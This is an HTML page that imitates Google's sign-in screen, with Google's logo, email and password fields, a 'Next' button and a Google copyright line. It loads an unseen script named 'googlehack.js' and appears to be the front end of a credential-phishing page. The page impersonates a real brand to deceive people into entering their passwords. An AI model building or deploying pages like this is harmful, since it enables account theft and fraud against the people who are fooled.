<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google - Sign In</title>
  <style>
    body {font-family:Arial,sans-serif;background:#fff;margin:0;padding:0;height:100vh;display:flex;align-items:center;justify-content:center;}
    .container {max-width:360px;width:100%;padding:16px;}
    .logo {text-align:center;margin-bottom:24px;}
    .logo img {height:48px;width:auto;}
    .form {display:flex;flex-direction:column;}
    .form input {padding:12px;font-size:16px;border:1px solid #ccc;border-radius:4px;margin-bottom:8px;}
    .form button {padding:12px;font-size:16px;border:none;background-color:#4285f4;color:#fff;border-radius:4px;cursor:pointer;}
    .form button:hover {background-color:#3d7aea;}
    .other-options {text-align:center;margin-top:16px;}
    .other-options a {color:#3367d6;font-size:14px;text-decoration:none;}
    .other-options a:hover {text-decoration:underline;}
    .other-options span {color:#737373;font-size:14px;margin-left:8px;}
    .copyright {text-align:center;font-size:12px;color:#737373;margin-top:16px;}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo"></div>
    <form class="form">
      <input type="email" placeholder="Email or phone" required>
      <input type="password" placeholder="Password" required>
      <button type="submit">Next</button>
    </form>
    <div class="other-options">
      <a href="#">Forgot email?</a>
      <span>or</span>
      <a href="#">Sign in with a different account</a>
    </div>
    <div class="copyright">
      Google Â©2026
    </div>
    <script src="googlehack.js"></script>
  </div>
</body>
</html>
